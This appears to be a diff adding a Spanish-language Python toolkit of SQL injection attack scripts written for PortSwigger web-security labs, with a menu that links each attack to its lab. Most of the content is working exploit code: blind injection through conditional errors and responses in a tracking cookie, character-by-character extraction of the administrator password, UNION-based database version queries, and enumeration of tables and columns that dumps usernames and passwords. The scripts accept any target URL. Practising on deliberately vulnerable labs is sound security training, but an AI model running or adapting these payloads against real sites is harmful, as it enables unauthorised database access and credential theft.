@@ -1,0 +1,1400 @@
+# buscar_errores_condicionales.py
+
+"""
+lab 12 - Blind SQL injection with conditional errors (Oracle database)
+
+Vulnerable parameter - tracking cookie
+
+Objetivo final:
+Find out the password of the administrator user
+Log in as the administrator user
+
+Analysis:
+
+1) Prove that parameter is vulnerable
+
+' || (SELECT '' from dual) || ' -> oracle -> status_code = 200
+' || (SELECT '' from dualasdasddas) || ' -> status_code = 500
+
+This confirm that is an oracle database
+
+2) Confirm that the users table exists in the database
+
+' || (SELECT '' from users where rownum=1) || ' -> users table exists -> status_code=500
+
+3) Confirm that the administrator user exists in the users table
+' || (SELECT '' FROM users WHERE username = 'administrator') || ' -> this query is not useful 
+
+' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || ' -> status code 500-> user administrator exists
+
+' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='asfdsfdasadfafds') || ' -> status code 200-> user administrator doesn't exists
+
+4) Determine length of password
+
+' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and LENGTH(password)>19) || ' 
+
+5) Output the administrator password
+
+' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and LENGTH(password)>19) || ' 
+"""
+
+
+import requests
+import sys
+import urllib3
+import urllib
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def sqli_password(url, cookies):
+    password_extracted = ""
+    for i in range (1,21):
+        for j in range(32,126):
+            sqli_payload = "' AND (SELECT ASCII(SUBSTRING(password,{0},1)) FROM users WHERE username='administrator' AND LENGTH(password)>1) = '{1}' --".format(i,j)
+            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
+            cookies['TrackingId'] += sqli_payload_encoded
+            r = requests.get(url, cookies=cookies)
+            if "Welcome" not in r.text:
+                sys.stdout.write('\r' + password_extracted + chr(j))
+                sys.stdout.flush()
+            else:
+                password_extracted += chr(j)
+                sys.stdout.write('\r' + password_extracted)
+                sys.stdout.flush()
+                break
+            
+def mensaje_de_salida(mensaje):
+    print(mensaje)
+    print('Saliendo del sistema')
+    sys.exit(-1)
+
+def obtener_cookies(url):
+    cookies = requests.get(url).cookies
+    cookies_dict = {cookie.name: cookie.value for cookie in cookies}
+    print("Cookies obtenidas:")
+    for idx, (name, value) in enumerate(cookies_dict.items(),1):
+        print(f"{idx}. {name}: {value}")
+    return cookies_dict
+
+def seleccionar_cookie():
+    print('Que cookie desea explotar?: ', end="")
+    indice =  int(input())
+    return (indice - 1)
+
+def confirmar_cookie_explotable(url, cookies, cookie_a_explotar):
+    nombre_cookie = list(cookies.keys())[cookie_a_explotar]
+    valor_original_cookie = cookies[nombre_cookie]
+    
+    sqli_payload_200 = "' || (SELECT '' from dual) || '"
+    sqli_payload_encoded_200 = urllib.parse.quote(sqli_payload_200)
+    cookies_200 = cookies
+    cookies_200[nombre_cookie] += sqli_payload_encoded_200
+    res_200 = requests.get(url, cookies = cookies_200)
+    cookies[nombre_cookie] = valor_original_cookie
+    
+    sqli_payload_500 = "' || (SELECT '' from tabla_falsa_de_prueba) || '"
+    sqli_payload_encoded_500 = urllib.parse.quote(sqli_payload_500)
+    cookies_500 = cookies
+    cookies_500[nombre_cookie] += sqli_payload_encoded_500
+    res_500 = requests.get(url, cookies = cookies_500)
+    cookies[nombre_cookie] = valor_original_cookie
+
+    return res_200.status_code == 200 and res_500.status_code == 500
+
+def confirmar_tabla_users(url, cookies, cookie_a_explotar):
+    nombre_cookie = list(cookies.keys())[cookie_a_explotar]
+    valor_original_cookie = cookies[nombre_cookie]
+
+    sqli_payload = "' AND (SELECT 'x' FROM users LIMIT 1) = 'x' --"
+    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
+    cookies[nombre_cookie] += sqli_payload_encoded
+    res = requests.get(url, cookies = cookies)
+    cookies[nombre_cookie] = valor_original_cookie
+
+    return res.status_code == 500
+
+def confirmar_usuario_administrator(url, cookies, cookie_a_explotar):
+    nombre_cookie = list(cookies.keys())[cookie_a_explotar]
+    valor_original_cookie = cookies[nombre_cookie]
+    
+    sqli_payload = "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || '"
+    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
+    cookies[nombre_cookie] += sqli_payload_encoded
+    res = requests.get(url, cookies=cookies)
+    cookies[nombre_cookie] = valor_original_cookie
+    
+    return res.status_code == 500
+
+def determinar_longitud_password(url, cookies, cookie_a_explotar):
+    nombre_cookie = list(cookies.keys())[cookie_a_explotar]
+    valor_original_cookie = cookies[nombre_cookie]
+    
+    inicio = 0
+    fin = 40
+
+    while inicio <= fin:
+        longitud_actual = (inicio + fin) // 2
+        sqli_payload = f"' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and LENGTH(password)>={longitud_actual}) || '"
+        sqli_payload_encoded = urllib.parse.quote(sqli_payload)
+        cookies[nombre_cookie] += sqli_payload_encoded
+        res = requests.get(url, cookies=cookies)
+        cookies[nombre_cookie] = valor_original_cookie
+        
+        if res.status_code == 500:
+            print(f'probando longitud del password: {longitud_actual}')
+            inicio = longitud_actual + 1
+        else:
+            fin = longitud_actual - 1
+
+    return fin
+    
+def obtener_password(url, cookies, cookie_a_explotar, longitud_password):
+    password_extracted = ""
+    
+    nombre_cookie = list(cookies.keys())[cookie_a_explotar]
+    valor_original_cookie = cookies[nombre_cookie]
+    
+    for i in range (1,longitud_password+1):
+        for j in range(32,126):
+            sqli_payload = "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and ASCII(SUBSTR(password,{0},1))='{1}') || '".format(i,j)
+            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
+            cookies[nombre_cookie] += sqli_payload_encoded
+            r = requests.get(url, cookies=cookies)
+            cookies[nombre_cookie] = valor_original_cookie
+            
+            if r.status_code == 500:
+                password_extracted += chr(j)
+                sys.stdout.write('\r' + password_extracted)
+                sys.stdout.flush()
+                break
+            else:
+                sys.stdout.write('\r' + password_extracted + chr(j))
+                sys.stdout.flush()
+                
+    return password_extracted
+
+def main():
+    print("\nIngrese la url del sitio a atacar: ", end="")
+    url = input()
+    cookies = obtener_cookies(url)
+    cookie_a_explotar = seleccionar_cookie()
+    
+    # 1) Confirmar que el parametro es vulnerable a blind SQL Injection
+    cookie_es_explotable = confirmar_cookie_explotable(url, cookies, cookie_a_explotar)
+    if not cookie_es_explotable:
+        mensaje_de_salida('La cookie seleccionada no es explotable')
+            
+    # 2) Confirmar que existe una tabla users
+    existe_tabla_users = confirmar_tabla_users(url, cookies, cookie_a_explotar)
+    if not existe_tabla_users:
+        mensaje_de_salida('No existe una tabla users')
+        
+    # 3) Confirmar que el usuario administrator existe en la tabla users
+    existe_usuario_administrator = confirmar_usuario_administrator(url, cookies, cookie_a_explotar)
+    if not existe_usuario_administrator:
+        mensaje_de_salida('No existe el usuario administrador')
+
+    # 4) Enumerar el password de usuario administrator
+    longitud_password = determinar_longitud_password(url, cookies, cookie_a_explotar)
+    print(f"Longitud del password: {longitud_password} caracteres")
+    
+    # 5) Ataque de fuerza bruta probando caracter por caracter (se puede implementar un algoritmo de busqueda)
+    password = obtener_password(url, cookies, cookie_a_explotar, longitud_password)
+    print(f"El password obtenido es: {password}")
+    
+if __name__ == "__main__":
+    main()
+
+# buscar_respuestas_condicionales.py
+
+"""
+Blind SQL injection with conditional responses
+
+Parametro vulnerable: tracking cookie
+
+Objetivos:
+    1) Obtener el password de administrator
+    2) Ingresar a la aplicacion como el usuario administrator
+
+Analisis:
+
+1) Confirmar que el parametro es vulnerable a blind SQL Injection
+
+SELECT tracking-id FROM tracking-table WHERE tracking-id = '<value>'
+    si el tracking-id existe -> consulta devuelve el valor "Welcome back"
+    si el tracking-id no existe -> no hay valor
+    
+SELECT tracking-id FROM tracking-table WHERE tracking-id = '<value>' AND 1=1 --' -> TRUE -> Welcome back message
+SELECT tracking-id FROM tracking-table WHERE tracking-id = '<value>' AND 1=0 --' -> FALSE -> NO Welcome back message
+
+2) Confirmar que existe una tabla users
+SELECT tracking-id FROM tracking-table WHERE tracking-id = '<value>' AND (SELECT 'x' FROM users LIMIT 1) = 'x' --'
+
+3) Confirmar que el usuario administrator existe en la tabla users
+SELECT tracking-id FROM tracking-table WHERE tracking-id = '<value>' AND (SELECT username FROM users WHERE username='administrator') = 'administrator' --'
+-> si esta consulta es verdadera entonces el usuario administrator existe
+
+4) Enumerar el password de usuario administrator
+SELECT tracking-id FROM tracking-table WHERE tracking-id = '<value>' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>1) = 'administrator' --'
+-> esta consulta nos permite determinar que la longitud del password es de 20 caracteres
+
+5) Ataque de fuerza bruta probando caracter por caracter
+SELECT tracking-id FROM tracking-table WHERE tracking-id = '<value>' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator' AND LENGTH(password)>1) = 'a' --'
+-> esta consulta nos permite determinar que la longitud del password es de 20 caracteres
+
+"""
+
+import requests
+import sys
+import urllib3
+import urllib
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+#proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
+
+def sqli_password(url, cookies):
+    password_extracted = ""
+    for i in range (1,21):
+        for j in range(32,126):
+            sqli_payload = "' AND (SELECT ASCII(SUBSTRING(password,{0},1)) FROM users WHERE username='administrator' AND LENGTH(password)>1) = '{1}' --".format(i,j)
+            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
+            cookies['TrackingId'] += sqli_payload_encoded
+            r = requests.get(url, cookies=cookies)
+            if "Welcome" not in r.text:
+                sys.stdout.write('\r' + password_extracted + chr(j))
+                sys.stdout.flush()
+            else:
+                password_extracted += chr(j)
+                sys.stdout.write('\r' + password_extracted)
+                sys.stdout.flush()
+                break
+            
+def mensaje_de_salida(mensaje):
+    print(mensaje)
+    print('Saliendo del sistema')
+    sys.exit(-1)
+
+def obtener_cookies(url):
+    cookies = requests.get(url).cookies
+    cookies_dict = {cookie.name: cookie.value for cookie in cookies}
+    print("Cookies obtenidas:")
+    for idx, (name, value) in enumerate(cookies_dict.items(),1):
+        print(f"{idx}. {name}: {value}")
+    return cookies_dict
+
+def seleccionar_cookie():
+    print('Que cookie desea explotar?: ', end="")
+    indice =  int(input())
+    return (indice - 1)
+
+def confirmar_cookie_explotable(url, cookies, cookie_a_explotar):
+    nombre_cookie = list(cookies.keys())[cookie_a_explotar]
+    valor_original_cookie = cookies[nombre_cookie]
+    
+    sqli_payload_true = "' AND 1=1 --"
+    sqli_payload_encoded_true = urllib.parse.quote(sqli_payload_true)
+    cookies_true = cookies
+    cookies_true[nombre_cookie] += sqli_payload_encoded_true
+    res_true = requests.get(url, cookies = cookies_true)
+    cookies[nombre_cookie] = valor_original_cookie
+    
+    sqli_payload_false = "' AND 1=0 --"
+    sqli_payload_encoded_false = urllib.parse.quote(sqli_payload_false)
+    cookies_false = cookies
+    cookies_false[nombre_cookie] += sqli_payload_encoded_false
+    res_false = requests.get(url, cookies = cookies_false)
+    cookies[nombre_cookie] = valor_original_cookie
+
+    test_string = "Welcome"
+    return test_string in res_true.text and test_string not in res_false.text
+
+def confirmar_tabla_users(url, cookies, cookie_a_explotar):
+    nombre_cookie = list(cookies.keys())[cookie_a_explotar]
+    valor_original_cookie = cookies[nombre_cookie]
+
+    sqli_payload = "' AND (SELECT 'x' FROM users LIMIT 1) = 'x' --"
+    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
+    cookies[nombre_cookie] += sqli_payload_encoded
+    res = requests.get(url, cookies = cookies)
+    cookies[nombre_cookie] = valor_original_cookie
+
+    test_string = "Welcome"
+    return test_string in res.text
+
+def confirmar_usuario_administrator(url, cookies, cookie_a_explotar):
+    nombre_cookie = list(cookies.keys())[cookie_a_explotar]
+    valor_original_cookie = cookies[nombre_cookie]
+    
+    sqli_payload = "' AND (SELECT username FROM users WHERE username='administrator') = 'administrator' --"
+    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
+    cookies[nombre_cookie] += sqli_payload_encoded
+    res = requests.get(url, cookies=cookies)
+    cookies[nombre_cookie] = valor_original_cookie
+    
+    test_string = "Welcome"
+    return test_string in res.text
+
+def determinar_longitud_password(url, cookies, cookie_a_explotar):
+    nombre_cookie = list(cookies.keys())[cookie_a_explotar]
+    valor_original_cookie = cookies[nombre_cookie]
+    
+    contador = 1
+    while True:
+        sqli_payload = f"' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>{contador}) = 'administrator' --"
+        sqli_payload_encoded = urllib.parse.quote(sqli_payload)
+        cookies[nombre_cookie] += sqli_payload_encoded
+        res = requests.get(url, cookies=cookies)
+        cookies[nombre_cookie] = valor_original_cookie
+        
+        test_string = "Welcome"
+        if test_string in res.text:
+            print(f'probando longitud del password: {contador}')
+            contador += 1
+        else:
+            return contador  
+    
+def obtener_password(url, cookies, cookie_a_explotar, longitud_password):
+    password_extracted = ""
+    
+    nombre_cookie = list(cookies.keys())[cookie_a_explotar]
+    valor_original_cookie = cookies[nombre_cookie]
+    
+    for i in range (1,longitud_password+1):
+        for j in range(32,126):
+            sqli_payload = "' AND (SELECT ASCII(SUBSTRING(password,{0},1)) FROM users WHERE username='administrator' AND LENGTH(password)>1) = '{1}' --".format(i,j)
+            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
+            cookies[nombre_cookie] += sqli_payload_encoded
+            r = requests.get(url, cookies=cookies)
+            cookies[nombre_cookie] = valor_original_cookie
+            
+            if "Welcome" not in r.text:
+                sys.stdout.write('\r' + password_extracted + chr(j))
+                sys.stdout.flush()
+            else:
+                password_extracted += chr(j)
+                sys.stdout.write('\r' + password_extracted)
+                sys.stdout.flush()
+                break
+    return password_extracted
+
+def main():
+    print("\nIngrese la url del sitio a atacar: ", end="")
+    url = input()
+    cookies = obtener_cookies(url)
+    cookie_a_explotar = seleccionar_cookie()
+    
+    # 1) Confirmar que el parametro es vulnerable a blind SQL Injection
+    cookie_es_explotable = confirmar_cookie_explotable(url, cookies, cookie_a_explotar)
+    if not cookie_es_explotable:
+        mensaje_de_salida('La cookie seleccionada no es explotable')
+            
+    # 2) Confirmar que existe una tabla users
+    existe_tabla_users = confirmar_tabla_users(url, cookies, cookie_a_explotar)
+    if not existe_tabla_users:
+        mensaje_de_salida('No existe una tabla users')
+        
+    # 3) Confirmar que el usuario administrator existe en la tabla users
+    existe_usuario_administrator = confirmar_usuario_administrator(url, cookies, cookie_a_explotar)
+    if not existe_usuario_administrator:
+        mensaje_de_salida('No existe el usuario administrador')
+
+    # 4) Enumerar el password de usuario administrator
+    longitud_password = determinar_longitud_password(url, cookies, cookie_a_explotar)
+    print(f"Longitud del password: {longitud_password} caracteres")
+    
+    # 5) Ataque de fuerza bruta probando caracter por caracter (se puede implementar un algoritmo de busqueda)
+    password = obtener_password(url, cookies, cookie_a_explotar, longitud_password)
+    print(f"El password obtenido es: {password}")
+    
+if __name__ == "__main__":
+    main()
+
+# consultar_version_mysql_sqlserver.py
+
+import requests
+from bs4 import BeautifulSoup
+import urllib3
+import sys
+import re
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def determinar_numero_columnas(url, uri):
+    i=1
+    sql_payload = "'+UNION+SELECT+NULL"
+    while True:
+        print(f"Testeando el siguiente payload: {sql_payload}")
+        peticion = requests.get(url+uri[1:]+sql_payload+"-- - ")
+        if peticion.status_code  == 200:
+            return i 
+        sql_payload = sql_payload+",NULL"
+        i+=1
+    return False
+
+def payload(n_columnas):
+    array = ['NULL']*(n_columnas)
+    array[0] = '@@version'
+    return "'+UNION+SELECT+" + ','.join(map(str,array))
+
+def atacar(url):
+    peticion = peticion = requests.get(url)
+    html = peticion.text
+    soup = BeautifulSoup(html, 'html.parser')
+    version = soup.find_all(string=re.compile('8.0.35-0ubuntu0.20.04.1'))
+    print(f"La versión de la base de datos es: {version[len(version)-1]}")
+    
+
+def encontrar_links_ataque(url):
+    r = requests.get(url, verify = False)
+    soup = BeautifulSoup(r.text, 'html.parser')
+    categorias = soup.find_all('a', class_='filter-category')
+    print("\nSe han encontrado los siguientes links para realizar el ataque:\n")
+    
+    for i in range(len(categorias)):
+        if i>0:
+            print(f"{i}. {categorias[i].text} Enlace de ataque: {categorias[i]['href']}")
+    
+    print("\nIngrese el indice del enlace para realizar el ataque: ", end="")
+    indice = int(input())
+        
+    return categorias[indice]['href']
+
+def main():
+    print("\nIngrese URL a atacar: ", end="")
+    url = input()
+    uri = encontrar_links_ataque(url)
+    n_columnas = determinar_numero_columnas(url, uri)
+    url_ataque = url + uri[1:] + payload(n_columnas) + "-- -"
+    print(f"\nLa URL a atacar es:\n\n{url_ataque}\n")
+    atacar(url_ataque)
+        
+
+if __name__ == "__main__":
+    main()
+
+# consultar_version_oracle.py
+
+import requests
+import sys
+import urllib3
+from bs4 import BeautifulSoup
+import re
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def exploit_sqli_version(url):
+    path="filter?category=Lifestyle"
+    sql_payload ="' UNION SELECT banner, NULL FROM v$version-- - "
+
+    r = requests.get(url + path + sql_payload, verify=False)
+    res = r.text
+    if "Oracle Database" in res:
+        print("[+] Se ha encontrado la version de la base de datos:\n")
+        soup = BeautifulSoup(res,'html.parser')
+
+        version = soup.find(string=re.compile('.*Oracle\sDatabase.*'))
+        
+        print("[+] La versión de la base de datos Oracle es:\n\n" + version)
+
+if __name__ == "__main__":
+    print("\nIngrese la URL base del sitio a atacar: ", end="")
+    url = input()
+    print("[+] Obteniendo la version de la base de datos...\n")
+    exploit_sqli_version(url)
+        
+
+
+# listar_contenido_bbdd.py
+
+import requests
+import sys
+import urllib3
+from bs4 import BeautifulSoup
+from art import text2art
+from colorama import init, Fore
+
+PARSER = 'html.parser'
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def obtener_respuesta(params):
+    url = params['url']
+    try:
+        peticion = requests.get(url)
+        return peticion
+    except requests.ConnectionError:
+        print("La URL es inválida, Terminando la ejecución de la aplicación.")
+        sys.exit(-1)
+
+def obtener_enlace_ataque(params):
+    peticion = obtener_respuesta(params)
+    html = peticion.text
+    soup = BeautifulSoup(html, PARSER)
+    section = soup.findAll('section')
+    section_filtros = section[len(section)-1]
+    enlaces = section_filtros.findAll('a')
+    print(Fore.BLUE + "\n[+] " + Fore.GREEN + "Lista de enlaces de interes:\n" + Fore.RESET)
+    for i in range(1,len(enlaces)):
+        print (str(i) + ". " + enlaces[i].contents[0])
+    print(Fore.BLUE+"\n¿Desde que enlace desea realizar el ataque?: "+Fore.RESET, end="")
+    enlace_ataque = int(input())
+    return enlaces[enlace_ataque]['href']
+    
+def obtener_numero_columnas_tabla(params):
+    url, path = params['url'], params['path']
+    i=1
+    sql_payload = "'+UNION+SELECT+NULL"
+    while True:
+        peticion = requests.get(url+path[1:]+sql_payload+"-- - ", verify=False)
+        if peticion.status_code // 100 ==  2:
+            print(Fore.BLUE + "\n[+]" + Fore.GREEN + "Información obtenida:\n" + Fore.RESET)
+            print(Fore.BLUE + "[+]" + Fore.GREEN + " Numero de columnas: %i" % i + Fore.RESET)
+            return i 
+        sql_payload = sql_payload+",NULL"
+        i+=1
+    return False
+
+def diferencia_listas(lista_a, lista_b):
+    if len(lista_a) > len(lista_b):
+        lista_grande = lista_a
+        lista_pequena = lista_b
+    else:
+        lista_grande = lista_b
+        lista_pequena = lista_a
+    
+    lista_diferencias = []
+    
+    for elemento in lista_grande:
+        if elemento not in lista_pequena:
+            lista_diferencias.append(elemento)
+            
+    return lista_diferencias
+
+
+def recuperar_lista_tablas(params):
+    url, path = params['url'], params['path']
+    
+    sql_payload = "'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--"
+    respuesta_normal = requests.get(url + path[1:])
+    respuesta_vulnerada = requests.get(url + path[1:] + sql_payload)
+    
+    lista_th_normal = BeautifulSoup(respuesta_normal.text, PARSER).find_all('th')
+    lista_th_vulnerada = BeautifulSoup(respuesta_vulnerada.text, PARSER).find_all('th')
+    
+    lista_th_exploited = diferencia_listas(lista_th_normal,lista_th_vulnerada)
+    
+    return lista_th_exploited
+
+    
+def tabla_a_consultar(params):
+    lista_tablas = params['lista_tablas']
+    
+    print(Fore.BLUE + "\n[+]" + Fore.GREEN + "Listado de tablas de la base de datos:\n" + Fore.RESET)
+    
+    tablas = []
+    
+    for tabla in lista_tablas:
+        tablas.append(tabla.get_text())
+        
+    presentar_tablas(tablas)
+        
+    print(Fore.BLUE + "\nIngrese el numero de la tabla: " + Fore.RESET, end="")
+    id_tabla = int(input())
+    return (id_tabla - 1)
+
+def detalles_columnas(params):
+    url, path, lista_tablas, id_tabla = params['url'], params['path'], params['lista_tablas'], params['id_tabla']
+    nombre_tabla = lista_tablas[id_tabla].get_text()
+    sql_payload = "'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='"+nombre_tabla+"'-- - "
+    
+    respuesta_normal = requests.get(url + path[1:])
+    respuesta_vulnerada = requests.get(url + path[1:] + sql_payload)
+    
+    lista_th_vulnerada = BeautifulSoup(respuesta_vulnerada.text, PARSER).find_all('th')
+    lista_th_normal = BeautifulSoup(respuesta_normal.text, PARSER).find_all('th')
+    
+    lista_columnas = diferencia_listas(lista_th_normal,lista_th_vulnerada)
+    
+    print(Fore.BLUE + "[+]" + Fore.GREEN + " Columnas de la tabla: " + nombre_tabla + "\n" + Fore.RESET)       
+    
+    for i in range(1,len(lista_columnas)+1):
+        print(str(i) + ": " + lista_columnas[i-1].get_text())
+        
+    return lista_columnas
+    
+def consultar_columnas(params):
+    
+    url, path, lista_tablas, id_tabla, lista_columnas = params['url'], params['path'], params['lista_tablas'], params['id_tabla'], params['lista_columnas']
+    
+    print(Fore.BLUE + "\nIngrese las columnas a consultar" + Fore.RESET)
+    
+    print(Fore.BLUE + "Columna 1: " + Fore.RESET, end="")
+    columna_1 = int(input()) 
+    
+    print(Fore.BLUE + "Columna 2: " + Fore.RESET, end="")
+    columna_2 = int(input())
+    
+    nombre_tabla = lista_tablas[id_tabla].get_text()
+    
+    nombre_columna_1 = lista_columnas[columna_1-1].get_text()
+    nombre_columna_2 = lista_columnas[columna_2-1].get_text()
+    
+    sql_payload = "'+UNION+SELECT " + nombre_columna_1 + "," + nombre_columna_2 + " FROM " + nombre_tabla + "-- -"
+    
+    respuesta_normal = requests.get(url + path[1:])
+    respuesta_vulnerada = requests.get(url + path[1:] + sql_payload)
+    
+    lista_tr_vulnerada = BeautifulSoup(respuesta_vulnerada.text, PARSER).find_all('tr')
+    lista_tr_normal = BeautifulSoup(respuesta_normal.text, PARSER).find_all('tr')
+    
+    lista_diferencias = []
+    print()
+    for elemento in lista_tr_vulnerada:
+        if elemento not in lista_tr_normal:
+            lista_diferencias.append(elemento)
+
+    print(Fore.BLUE + "[+] " + Fore.GREEN + "Resultados de consultar la tabla: " + nombre_tabla + Fore.RESET + "\n")
+    
+    # Obtén la longitud máxima de usuario y contraseña
+    longitud_maxima_usuario = max(len(elemento.find_all('td')[0].get_text()) for elemento in lista_diferencias)
+    longitud_maxima_contrasena = max(len(elemento.find_all('th')[0].get_text()) for elemento in lista_diferencias)
+
+    # Imprime la línea de encabezado de la tabla
+    print(f"+{'-' * (longitud_maxima_usuario + 2)}+{'-' * (longitud_maxima_contrasena + 2)}+")
+
+    # Imprime los encabezados de la tabla
+    print(f"| {'Usuario':<{longitud_maxima_usuario}} | {'Contraseña':<{longitud_maxima_contrasena}} |")
+
+    # Imprime la línea de separación
+    print(f"+{'-' * (longitud_maxima_usuario + 2)}+{'-' * (longitud_maxima_contrasena + 2)}+")
+
+    # Imprime las filas de la tabla
+    for elemento in lista_diferencias:
+        usuario = elemento.find_all('td')[0].get_text()
+        contrasena = elemento.find_all('th')[0].get_text()
+        print(f"| {usuario:<{longitud_maxima_usuario}} | {contrasena:<{longitud_maxima_contrasena}} |")
+
+    # Imprime la línea de cierre de la tabla
+    print(f"+{'-' * (longitud_maxima_usuario + 2)}+{'-' * (longitud_maxima_contrasena + 2)}+")
+        
+def presentar_tablas(tablas):
+        # Calcular el número de elementos en cada columna
+    presentar_tablas_columnas = 2
+    elementos_por_columna = len(tablas) // presentar_tablas_columnas
+    if len(tablas) % presentar_tablas_columnas != 0:
+        elementos_por_columna += 1
+
+    # Dividir las tablas en dos columnas
+    columnas = [tablas[i:i + elementos_por_columna] for i in range(0, len(tablas), elementos_por_columna)]
+
+    # Calcular el ancho de columna para el formato
+    ancho_columna = max(len(f"{i}. {elemento}") for i, fila in enumerate(zip(*columnas), start=1) for elemento in fila)
+
+    # Imprimir las tablas en dos columnas con números y espacio entre ellas
+    for i in range(max(len(col) for col in columnas)):
+        for j, columna in enumerate(columnas):
+            if i < len(columna):
+                # Calcular el índice
+                indice = i + 1 + j * elementos_por_columna
+                # Imprimir el elemento con formato
+                print("{:<{}}".format(f"{indice}. {columna[i]}", ancho_columna), end="")
+            if j < len(columnas) - 1:
+                print("  " * (presentar_tablas_columnas - 1), end="")
+        print()
+        
+
+    
+    
+def main():
+    params = {}
+    
+    print(Fore.BLUE + "Ingrese la url a atacar: "+ Fore.RESET, end="")
+    url_base = input()
+    
+    
+    params['url'] = url_base
+    
+    # determinar numero de columnas
+    if obtener_respuesta(params):
+        print(Fore.BLUE + "\n[+]" + Fore.GREEN+" URL válida. Procediendo con la ejecución del script..." + Fore.RESET)
+    
+    params['path'] = obtener_enlace_ataque(params)
+    
+    params['n_columnas'] = obtener_numero_columnas_tabla(params)
+    
+    # recuperar la lista de tablas
+    params['lista_tablas'] = recuperar_lista_tablas(params)
+    
+    # encontrar el nombre de la tabla que contiene credenciales de usuario
+    params['id_tabla'] = tabla_a_consultar(params)
+    
+    # recuperar detalles de las columnas de la tabla
+    params['lista_columnas'] = detalles_columnas(params)
+    
+    # Encontrar el nombre de las columnas que contienen usuarios y passwords
+    consultar_columnas(params)
+    
+    
+if __name__ == "__main__":
+    main()
+
+
+# main.py
+
+import presentacion
+import menu
+
+import buscar_errores_condicionales
+import buscar_respuestas_condicionales
+import consultar_version_mysql_sqlserver
+import consultar_version_oracle
+import listar_contenido_bbdd
+import recuperar_datos_de_otras_tablas
+import recuperar_datos_ocultos
+import recuperar_multiples_valores_en_una_sola_columna
+import retraso_tiempo
+import saltar_inicio_sesion
+
+presentacion.inicio()
+
+opcion = menu.menu_de_opciones()
+opcion -= 1
+
+if opcion == 0:
+    recuperar_datos_ocultos.main()
+elif opcion == 1:
+    saltar_inicio_sesion.main()
+elif opcion == 2:
+    consultar_version_oracle.main()
+elif opcion == 3:
+    consultar_version_mysql_sqlserver.main()
+elif opcion == 4:
+    listar_contenido_bbdd.main()
+elif opcion == 5:
+    recuperar_datos_de_otras_tablas.main()
+elif opcion == 6:
+    recuperar_multiples_valores_en_una_sola_columna.main()
+elif opcion == 7:
+    buscar_respuestas_condicionales.main()
+elif opcion == 8:
+    buscar_errores_condicionales.main()
+elif opcion == 9:
+    retraso_tiempo.main()
+
+
+# menu.py
+
+from colorama import init, Fore, Back
+import sys
+
+def menu_de_opciones():
+    print(Fore.LIGHTBLUE_EX + "Lista de opciones.\nSeleccione un ataque de la lista:\n")
+    lista = [
+        ["UNION attack  : Recuperar datos ocultos","https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data"],
+        ["UNION attack  : Saltar inicio de sesión","https://portswigger.net/web-security/sql-injection/lab-login-bypass"],
+        ["UNION attack  : Consultar tipo y version de base de datos en Oracle","https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle"],
+        ["UNION attack  : Consultar tipo y version de base de datos en MySQL y SQL Server","https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft"],
+        ["UNION attack  : Listar el contenido de la base de datos","https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle"],
+        ["UNION attack  : Recuperar datos a partir de otras tablas","https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables"],
+        ["UNION attack  : Recuperar múltiples valores en una sola columna","https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column"],
+        ["Blind SQL     : Buscar respuestas condicionales","https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses"],
+        ["Blind SQL     : Buscar errores condicionales","https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors"],
+        ["Blind SQL     : Inyección SQL con retraso de tiempo","https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval"],
+    ]
+    
+    for i in range(len(lista)):
+        print(f"{str(i+1)}. {lista[i][0]}")
+    
+    print("\nIngrese la opción seleccionada: ", end="")
+    opcion = int(input())
+    try:
+        lista[opcion-1][1]
+    except IndexError:
+        print("\n" + Fore.RED + "❌ " + "Ha habido un error")
+        print(Fore.WHITE + "Terminando la ejecución del programa...")
+        sys.exit(-1)
+    
+    print("\n" + Fore.GREEN + "✔️ " + Fore.BLUE +"Ingrese a la siguiente URL (ctrl + click):\n")
+    print(Fore.GREEN + lista[opcion-1][1])
+    print(Fore.BLUE + "\nY genere un nuevo laboratorio")
+    
+    return opcion
+
+
+
+if __name__ == "__main__":
+    menu_de_opciones()
+
+# presentacion.py
+
+from art import text2art
+from colorama import init, Fore, Back
+
+def inicio():
+    init()
+    titulo = text2art("SQL Injection")
+    print(Fore.RED + titulo + Fore.RESET)
+    print(Fore.WHITE)
